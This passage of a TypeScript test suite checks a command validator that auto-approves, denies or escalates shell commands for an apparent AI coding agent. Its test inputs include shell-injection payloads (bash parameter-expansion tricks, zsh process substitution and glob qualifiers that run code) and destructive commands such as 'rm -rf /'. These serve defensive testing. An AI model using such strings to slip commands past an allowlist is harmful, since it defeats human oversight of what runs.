		})

		it("handles equal length matches with denylist winning", () => {
			const allowedEqual = ["npm test"]
			const deniedEqual = ["npm test"]

			// Equal length - denylist wins (secure by default)
			expect(getSingleCommandDecision("npm test --coverage", allowedEqual, deniedEqual)).toBe("auto_deny")
		})

		it("handles wildcard patterns correctly", () => {
			const allowedWildcard = ["*"]
			const deniedSpecific = ["rm -rf"]

			// "*" (1 char) vs "rm -rf" (6 chars) - denylist wins for matching commands
			expect(getSingleCommandDecision("rm -rf /", allowedWildcard, deniedSpecific)).toBe("auto_deny")
			// Non-matching commands should be auto-approved by wildcard
			expect(getSingleCommandDecision("npm test", allowedWildcard, deniedSpecific)).toBe("auto_approve")
		})

		it("handles empty command", () => {
			expect(getSingleCommandDecision("", allowedCommands, deniedCommands)).toBe("auto_approve")
		})

		it("handles empty lists", () => {
			expect(getSingleCommandDecision("npm test", [], [])).toBe("ask_user")
			expect(getSingleCommandDecision("npm test", undefined as any, undefined as any)).toBe("ask_user")
		})
	})

	describe("getCommandDecision", () => {
		const allowedCommands = ["npm", "echo"]
		const deniedCommands = ["npm test"]

		it("returns auto_approve for commands with all sub-commands auto-approved", () => {
			expect(getCommandDecision("npm install", allowedCommands, deniedCommands)).toBe("auto_approve")
			expect(getCommandDecision("npm install && echo done", allowedCommands, deniedCommands)).toBe("auto_approve")
		})

		describe("dangerous substitution handling", () => {
			it("prevents auto-approve for commands with dangerous parameter expansion", () => {
				// Commands that would normally be auto-approved are blocked by dangerous patterns
				expect(getCommandDecision("echo ${var@P}", allowedCommands, deniedCommands)).toBe("ask_user")
				expect(getCommandDecision("echo hello", allowedCommands, deniedCommands)).toBe("auto_approve") // Safe version

				// Even with allowed prefix, dangerous patterns prevent auto-approval
				expect(getCommandDecision("npm install ${var@P}", allowedCommands, deniedCommands)).toBe("ask_user")
				expect(
					getCommandDecision('echo "${var1=\\140whoami\\140c}${var1@P}"', allowedCommands, deniedCommands),
				).toBe("ask_user")
			})

			it("does NOT override auto_deny decisions with dangerous patterns", () => {
				// If a command would be denied, dangerous patterns don't change that
				expect(getCommandDecision("npm test ${var@P}", allowedCommands, deniedCommands)).toBe("auto_deny")
				expect(getCommandDecision('npm test "${var=\\140ls\\140}"', allowedCommands, deniedCommands)).toBe(
					"auto_deny",
				)

				// Regular denied commands without dangerous patterns
				expect(getCommandDecision("npm test --coverage", allowedCommands, deniedCommands)).toBe("auto_deny")
			})

			it("prevents auto-approval for various dangerous substitution types", () => {
				// Octal escape sequences
				expect(getCommandDecision('echo "${var=\\140ls\\140}"', allowedCommands, deniedCommands)).toBe(
					"ask_user",
				)
				expect(getCommandDecision('npm run "${var:=\\140pwd\\140}"', allowedCommands, deniedCommands)).toBe(
					"ask_user",
				)

				// Hex escape sequences
				expect(getCommandDecision('echo "${var=\\x60whoami\\x60}"', allowedCommands, deniedCommands)).toBe(
					"ask_user",
				)

				// Indirect variable references
				expect(getCommandDecision("echo ${!var}", allowedCommands, deniedCommands)).toBe("ask_user")

				// Here-strings with command substitution
				expect(getCommandDecision("cat <<<$(whoami)", allowedCommands, deniedCommands)).toBe("ask_user")
				expect(getCommandDecision("read <<<`date`", allowedCommands, deniedCommands)).toBe("ask_user")
			})

			it("allows safe parameter expansions to follow normal rules", () => {
				// Safe parameter expansions should follow normal allowlist/denylist rules
				expect(getCommandDecision("echo ${var}", allowedCommands, deniedCommands)).toBe("auto_approve")
				expect(getCommandDecision("echo ${var:-default}", allowedCommands, deniedCommands)).toBe("auto_approve")
				expect(getCommandDecision("npm install ${package_name}", allowedCommands, deniedCommands)).toBe(
					"auto_approve",
				)

				// Here-strings without command substitution are safe
				expect(getCommandDecision("echo test <<<$var", allowedCommands, deniedCommands)).toBe("auto_approve")
			})

			it("handles command chains correctly with dangerous patterns", () => {
				// If any part of a chain has dangerous substitution, prevent auto-approval
				expect(getCommandDecision("npm install && echo ${var@P}", allowedCommands, deniedCommands)).toBe(
					"ask_user",
				)
				expect(
					getCommandDecision('echo safe && echo "${var=\\140ls\\140}"', allowedCommands, deniedCommands),
				).toBe("ask_user")

				// But if chain would be denied, keep the deny decision
				expect(getCommandDecision("npm test ${var@P} && echo safe", allowedCommands, deniedCommands)).toBe(
					"auto_deny",
				)
				expect(getCommandDecision("npm install && npm test ${var@P}", allowedCommands, deniedCommands)).toBe(
					"auto_deny",
				)

				// Safe chains should still be auto-approved
				expect(getCommandDecision("npm install && echo done", allowedCommands, deniedCommands)).toBe(
					"auto_approve",
				)
			})

			it("handles the exact exploit from the security report", () => {
				const exploit = 'echo "${var1=aa\\140whoami\\140c}${var1@P}"'
				// Even though 'echo' is in the allowlist, the dangerous pattern prevents auto-approval
				expect(getCommandDecision(exploit, allowedCommands, deniedCommands)).toBe("ask_user")

				// But if it were a denied command, it would still be denied
				expect(getCommandDecision(`npm test ${exploit}`, allowedCommands, deniedCommands)).toBe("auto_deny")
			})

			it("prevents auto-approval for zsh process substitution exploits", () => {
				// The new zsh process substitution exploit
				const zshExploit = "ls =(open -a Calculator)"
				// Even though 'ls' might be allowed, the dangerous pattern prevents auto-approval
				expect(getCommandDecision(zshExploit, ["ls", "echo"], [])).toBe("ask_user")

				// Various forms should all be blocked
				expect(getCommandDecision("cat =(whoami)", ["cat"], [])).toBe("ask_user")
				expect(getCommandDecision("diff =(cmd1) =(cmd2)", ["diff"], [])).toBe("ask_user")
				expect(getCommandDecision("echo test =(date)", ["echo"], [])).toBe("ask_user")

				// Combined with denied commands
				expect(getCommandDecision("rm =(echo test)", ["echo"], ["rm"])).toBe("auto_deny")
			})

			it("prevents auto-approval for zsh glob qualifier exploits", () => {
				// The zsh glob qualifier exploit with code execution
				const globExploit = "ls *(e:whoami:)"
				// Even though 'ls' might be allowed, the dangerous pattern prevents auto-approval
				expect(getCommandDecision(globExploit, ["ls", "echo"], [])).toBe("ask_user")

				// Various forms should all be blocked
				expect(getCommandDecision("cat ?(e:rm -rf /:)", ["cat"], [])).toBe("ask_user")
				expect(getCommandDecision("echo +(e:date:)", ["echo"], [])).toBe("ask_user")
				expect(getCommandDecision("touch @(e:pwd:)", ["touch"], [])).toBe("ask_user")
				expect(getCommandDecision("rm !(e:ls:)", ["rm"], [])).toBe("ask_user") // rm not in allowlist, has dangerous pattern

				// Combined with denied commands
				expect(getCommandDecision("rm *(e:echo test:)", ["echo"], ["rm"])).toBe("auto_deny")

				// Multiple glob qualifiers
				expect(getCommandDecision("ls *(e:whoami:) ?(e:pwd:)", ["ls"], [])).toBe("ask_user")
			})
		})

		it("returns auto_deny for commands with any sub-command auto-denied", () => {
			expect(getCommandDecision("npm test", allowedCommands, deniedCommands)).toBe("auto_deny")
			expect(getCommandDecision("npm install && npm test", allowedCommands, deniedCommands)).toBe("auto_deny")
		})

		it("returns ask_user for commands with mixed or unknown sub-commands", () => {
			expect(getCommandDecision("dangerous", allowedCommands, deniedCommands)).toBe("ask_user")
			expect(getCommandDecision("npm install && dangerous", allowedCommands, deniedCommands)).toBe("ask_user")
		})

		it("properly validates subshell commands by checking all parsed commands", () => {
			// Subshells without denied prefixes should be auto-approved if all commands are allowed
			expect(getCommandDecision("npm install $(echo test)", allowedCommands, deniedCommands)).toBe("auto_approve")
			expect(getCommandDecision("npm install `echo test`", allowedCommands, deniedCommands)).toBe("auto_approve")

			// Subshells with denied prefixes should be auto-denied
			expect(getCommandDecision("npm install $(npm test)", allowedCommands, deniedCommands)).toBe("auto_deny")
			expect(getCommandDecision("npm install `npm test --coverage`", allowedCommands, deniedCommands)).toBe(
				"auto_deny",
			)

			// Main command with denied prefix should also be auto-denied
			expect(getCommandDecision("npm test $(echo hello)", allowedCommands, deniedCommands)).toBe("auto_deny")
		})

		it("properly validates subshell commands when no denylist is present", () => {
			expect(getCommandDecision("npm install $(echo test)", allowedCommands)).toBe("auto_approve")
			expect(getCommandDecision("npm install `echo test`", allowedCommands)).toBe("auto_approve")
		})

		it("handles empty command", () => {
			expect(getCommandDecision("", allowedCommands, deniedCommands)).toBe("auto_approve")
		})

		it("handles complex chained commands", () => {
			// All sub-commands auto-approved
			expect(getCommandDecision("npm install && echo success && npm run build", ["npm", "echo"], [])).toBe(
				"auto_approve",
			)

			// One sub-command auto-denied
			expect(getCommandDecision("npm install && npm test && echo done", allowedCommands, deniedCommands)).toBe(
				"auto_deny",
			)

			// Mixed decisions (some ask_user)
			expect(getCommandDecision("npm install && dangerous && echo done", allowedCommands, deniedCommands)).toBe(
				"ask_user",
			)
		})

		it("demonstrates the three-tier system comprehensively", () => {
			const allowed = ["npm"]
			const denied = ["npm test"]

			// Auto-approved: all sub-commands match allowlist, none match denylist
			expect(getCommandDecision("npm install", allowed, denied)).toBe("auto_approve")
			expect(getCommandDecision("npm install && npm run build", allowed, denied)).toBe("auto_approve")

			// Auto-denied: any sub-command matches denylist
			expect(getCommandDecision("npm test", allowed, denied)).toBe("auto_deny")
			expect(getCommandDecision("npm install && npm test", allowed, denied)).toBe("auto_deny")

			// Ask user: commands that match neither list
			expect(getCommandDecision("dangerous", allowed, denied)).toBe("ask_user")
			expect(getCommandDecision("npm install && dangerous", allowed, denied)).toBe("ask_user")
		})
	})

	describe("CommandValidator Integration Tests", () => {
		describe("CommandValidator Class", () => {
			let validator: CommandValidator

			beforeEach(() => {
				validator = new CommandValidator(["npm", "echo", "git"], ["npm test", "git push"])
			})

			describe("Basic validation methods", () => {
				it("validates commands correctly", () => {
					expect(validator.validateCommand("npm install")).toBe("auto_approve")
					expect(validator.validateCommand("npm test")).toBe("auto_deny")
					expect(validator.validateCommand("dangerous")).toBe("ask_user")
				})

				it("provides convenience methods", () => {
					expect(validator.isAutoApproved("npm install")).toBe(true)
					expect(validator.isAutoApproved("npm test")).toBe(false)
					expect(validator.isAutoApproved("dangerous")).toBe(false)

					expect(validator.isAutoDenied("npm install")).toBe(false)
					expect(validator.isAutoDenied("npm test")).toBe(true)
					expect(validator.isAutoDenied("dangerous")).toBe(false)

					expect(validator.requiresUserInput("npm install")).toBe(false)
					expect(validator.requiresUserInput("npm test")).toBe(false)
					expect(validator.requiresUserInput("dangerous")).toBe(true)
				})
			})

			describe("Configuration management", () => {
				it("updates command lists", () => {
					validator.updateCommandLists(["echo"], ["echo hello"])

					expect(validator.validateCommand("npm install")).toBe("ask_user")
					expect(validator.validateCommand("echo world")).toBe("auto_approve")
					expect(validator.validateCommand("echo hello")).toBe("auto_deny")
				})

				it("gets current command lists", () => {
					const lists = validator.getCommandLists()
					expect(lists.allowedCommands).toEqual(["npm", "echo", "git"])
					expect(lists.deniedCommands).toEqual(["npm test", "git push"])
				})

				it("handles undefined denied commands", () => {
					const validatorNoDeny = new CommandValidator(["npm"])
					const lists = validatorNoDeny.getCommandLists()
					expect(lists.allowedCommands).toEqual(["npm"])
					expect(lists.deniedCommands).toBeUndefined()
				})
			})

			describe("Detailed validation information", () => {
				it("provides comprehensive validation details", () => {
					const details = validator.getValidationDetails("npm install && echo done")

					expect(details.decision).toBe("auto_approve")
					expect(details.subCommands).toEqual(["npm install", "echo done"])
					expect(details.allowedMatches).toHaveLength(2)
					expect(details.deniedMatches).toHaveLength(2)

					// Check specific matches
					expect(details.allowedMatches[0]).toEqual({ command: "npm install", match: "npm" })
					expect(details.allowedMatches[1]).toEqual({ command: "echo done", match: "echo" })
					expect(details.deniedMatches[0]).toEqual({ command: "npm install", match: null })
					expect(details.deniedMatches[1]).toEqual({ command: "echo done", match: null })
				})

				it("detects subshells correctly", () => {
					const details = validator.getValidationDetails("npm install $(echo test)")
					expect(details.decision).toBe("auto_approve") // all commands are allowed

					// Test with denied prefix in subshell
					const detailsWithDenied = validator.getValidationDetails("npm install $(npm test)")
					expect(detailsWithDenied.decision).toBe("auto_deny") // npm test is denied
				})

				it("handles complex command chains", () => {
					const details = validator.getValidationDetails("npm test && git push origin")

					expect(details.decision).toBe("auto_deny")
					expect(details.subCommands).toEqual(["npm test", "git push origin"])
					expect(details.deniedMatches[0]).toEqual({ command: "npm test", match: "npm test" })
					expect(details.deniedMatches[1]).toEqual({ command: "git push origin", match: "git push" })
				})
			})

			describe("Batch validation", () => {
				it("validates multiple commands at once", () => {
					const commands = ["npm install", "npm test", "dangerous", "echo hello"]
					const results = validator.validateCommands(commands)

					expect(results.get("npm install")).toBe("auto_approve")
					expect(results.get("npm test")).toBe("auto_deny")
					expect(results.get("dangerous")).toBe("ask_user")
					expect(results.get("echo hello")).toBe("auto_approve")
					expect(results.size).toBe(4)
				})

				it("handles empty command list", () => {
					const results = validator.validateCommands([])
					expect(results.size).toBe(0)
				})
			})

			describe("Configuration analysis", () => {
				it("detects if rules are configured", () => {
					expect(validator.hasRules()).toBe(true)

					const emptyValidator = new CommandValidator([], [])
					expect(emptyValidator.hasRules()).toBe(false)

					const allowOnlyValidator = new CommandValidator(["npm"], [])
					expect(allowOnlyValidator.hasRules()).toBe(true)

					const denyOnlyValidator = new CommandValidator([], ["rm"])
					expect(denyOnlyValidator.hasRules()).toBe(true)
				})

				it("provides configuration statistics", () => {
					const stats = validator.getStats()
					expect(stats.allowedCount).toBe(3)
					expect(stats.deniedCount).toBe(2)
					expect(stats.hasWildcard).toBe(false)
					expect(stats.hasRules).toBe(true)
				})

				it("detects wildcard configuration", () => {
					const wildcardValidator = new CommandValidator(["*", "npm"], ["rm"])
					const stats = wildcardValidator.getStats()
					expect(stats.hasWildcard).toBe(true)
				})
			})

			describe("Edge cases and error handling", () => {
				it("handles empty commands gracefully", () => {
					expect(validator.validateCommand("")).toBe("auto_approve")
					expect(validator.validateCommand("   ")).toBe("auto_approve")
				})

				it("handles commands with only whitespace", () => {
					const details = validator.getValidationDetails("   ")
					expect(details.decision).toBe("auto_approve")
					expect(details.subCommands).toEqual([])
				})

				it("handles malformed commands", () => {
					// Commands with unmatched quotes or brackets should not crash
					expect(() => validator.validateCommand('npm test "unclosed quote')).not.toThrow()
					expect(() => validator.validateCommand("npm test $(unclosed")).not.toThrow()
				})
			})
		})

		describe("Factory function", () => {
			it("creates validator instances correctly", () => {
				const validator = createCommandValidator(["npm"], ["rm"])
				expect(validator).toBeInstanceOf(CommandValidator)
				expect(validator.validateCommand("npm test")).toBe("auto_approve")
				expect(validator.validateCommand("rm file")).toBe("auto_deny")
			})

			it("handles optional denied commands", () => {
				const validator = createCommandValidator(["npm"])
				expect(validator.validateCommand("npm test")).toBe("auto_approve")
				expect(validator.validateCommand("dangerous")).toBe("ask_user")
			})
		})

		describe("Subshell edge cases", () => {
			it("handles multiple subshells correctly", () => {
				const validator = createCommandValidator(["echo", "npm"], ["rm", "sudo"])

				// Multiple subshells, none with denied prefixes but subshell commands not in allowlist
				// parseCommand extracts subshells as separate commands, so date and pwd are not allowed
				expect(validator.validateCommand("echo $(date) $(pwd)")).toBe("ask_user")

				// Multiple subshells, one with denied prefix
				expect(validator.validateCommand("echo $(date) $(rm file)")).toBe("auto_deny")

				// Nested subshells - validates individual parsed commands
				expect(validator.validateCommand("echo $(echo $(date))")).toBe("ask_user")
				expect(validator.validateCommand("echo $(echo $(rm file))")).toBe("ask_user") // complex nested parsing with mixed validation results
			})

			it("handles complex commands with subshells", () => {
				const validator = createCommandValidator(["npm", "git", "echo"], ["git push", "npm publish"])

				// Subshell with allowed command - git status is extracted as separate command
				// Since "git status" starts with "git" which is allowed, it's approved
				expect(validator.validateCommand("npm run $(git status)")).toBe("auto_approve")

				// Subshell with denied command
				expect(validator.validateCommand("npm run $(git push origin)")).toBe("auto_deny")

				// Main command denied, subshell allowed
				expect(validator.validateCommand("git push $(echo origin)")).toBe("auto_deny")

				// Complex chain with subshells - need echo in allowlist
				expect(validator.validateCommand("npm install && echo $(git status) && npm test")).toBe("auto_approve")
				expect(validator.validateCommand("npm install && echo $(git push) && npm test")).toBe("auto_deny")
			})
		})

		describe("Real-world integration scenarios", () => {
			describe("Development workflow validation", () => {
				let devValidator: CommandValidator

				beforeEach(() => {
					devValidator = createCommandValidator(
						["npm", "git", "echo", "ls", "cat"],
						["git push", "rm", "sudo", "npm publish"],
					)
				})

				it("allows common development commands", () => {
					const commonCommands = [
						"npm install",
						"npm test",
						"npm run build",
						"git status",
						"git add .",
						"git commit -m 'fix'",
						"echo 'done'",
						"ls -la",
						"cat package.json",
					]

					commonCommands.forEach((cmd) => {
						expect(devValidator.isAutoApproved(cmd)).toBe(true)
					})
				})

				it("blocks dangerous commands", () => {
					const dangerousCommands = [
						"git push origin main",
						"rm -rf node_modules",
						"sudo apt install",
						"npm publish",
					]

					dangerousCommands.forEach((cmd) => {
						expect(devValidator.isAutoDenied(cmd)).toBe(true)
					})
				})

				it("requires user input for unknown commands", () => {
					const unknownCommands = ["docker run", "python script.py", "curl https://api.example.com"]

					unknownCommands.forEach((cmd) => {
						expect(devValidator.requiresUserInput(cmd)).toBe(true)
					})
				})
			})

			describe("Production environment validation", () => {
				let prodValidator: CommandValidator

				beforeEach(() => {
					prodValidator = createCommandValidator(
						["ls", "cat", "grep", "tail"],
						["*"], // Deny everything by default
					)
				})

				it("allows only read-only commands", () => {
					expect(prodValidator.isAutoApproved("ls -la")).toBe(true)
					expect(prodValidator.isAutoApproved("cat /var/log/app.log")).toBe(true)
					expect(prodValidator.isAutoApproved("grep ERROR /var/log/app.log")).toBe(true)
					expect(prodValidator.isAutoApproved("tail -f /var/log/app.log")).toBe(true)
				})

				it("blocks all other commands due to wildcard deny", () => {
					const blockedCommands = ["npm install", "git push", "rm file", "echo hello", "mkdir test"]

					blockedCommands.forEach((cmd) => {
						expect(prodValidator.isAutoDenied(cmd)).toBe(true)
					})
				})
			})

			describe("Longest prefix match in complex scenarios", () => {
				let complexValidator: CommandValidator

				beforeEach(() => {
					complexValidator = createCommandValidator(
						["git", "git push", "git push --dry-run", "npm", "npm test"],
						["git push", "npm test --coverage"],
					)
				})

				it("demonstrates longest prefix match resolution", () => {
					// git push --dry-run (allowed, 18 chars) vs git push (denied, 8 chars) -> allow
					expect(complexValidator.isAutoApproved("git push --dry-run origin main")).toBe(true)

					// git push origin (denied, 8 chars) vs git (allowed, 3 chars) -> deny
					expect(complexValidator.isAutoDenied("git push origin main")).toBe(true)

					// npm test (allowed, 8 chars) vs npm test --coverage (denied, 19 chars) -> deny
					expect(complexValidator.isAutoDenied("npm test --coverage --watch")).toBe(true)

					// npm test basic (allowed, 8 chars) vs no deny match -> allow
					expect(complexValidator.isAutoApproved("npm test basic")).toBe(true)
				})

				it("handles command chains with mixed decisions", () => {
					// One command denied -> whole chain denied
					expect(complexValidator.isAutoDenied("git status && git push origin")).toBe(true)

					// All commands approved -> whole chain approved
					expect(complexValidator.isAutoApproved("git status && git push --dry-run")).toBe(true)

					// Mixed with unknown -> ask user
					expect(complexValidator.requiresUserInput("git status && unknown-command")).toBe(true)
				})
			})

			describe("Performance and scalability", () => {
				it("handles large command lists efficiently", () => {
					const largeAllowList = Array.from({ length: 1000 }, (_, i) => `command${i}`)
					const largeDenyList = Array.from({ length: 500 }, (_, i) => `dangerous${i}`)

					const largeValidator = createCommandValidator(largeAllowList, largeDenyList)

					// Should still work efficiently
					expect(largeValidator.isAutoApproved("command500 --flag")).toBe(true)
					expect(largeValidator.isAutoDenied("dangerous250 --flag")).toBe(true)
					expect(largeValidator.requiresUserInput("unknown")).toBe(true)
				})

				it("handles batch validation efficiently", () => {
					const batchValidator = createCommandValidator(["npm"], ["rm"])
					const commands = Array.from({ length: 100 }, (_, i) => `npm test${i}`)
					const results = batchValidator.validateCommands(commands)

					expect(results.size).toBe(100)
					// All should be auto-approved since they match "npm" allowlist
					Array.from(results.values()).forEach((decision) => {
						expect(decision).toBe("auto_approve")
					})
				})
			})
		})
	})
})
